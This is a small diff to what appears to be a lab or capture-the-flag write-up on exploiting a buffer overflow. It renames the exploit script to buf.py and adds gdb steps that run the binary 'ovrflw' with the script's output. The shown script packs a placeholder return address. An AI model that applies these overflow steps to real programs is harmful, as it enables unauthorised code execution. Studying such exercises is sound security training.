@@ -104,7 +104,7 @@ Identify where the buffer overflow occurs
 
 * go to ubuntu to write the buffer overflow script
 
-**--- bf.py ---**
+**--- buf.py ---**
 
 ```
 import struct
@@ -115,5 +115,8 @@ buf += struct.pack("<I",0xd3adc0d3)
 print buf
 ```
 
+* gdb ./ovrflw
+* ``r `python buf.py```
+* 
 
 
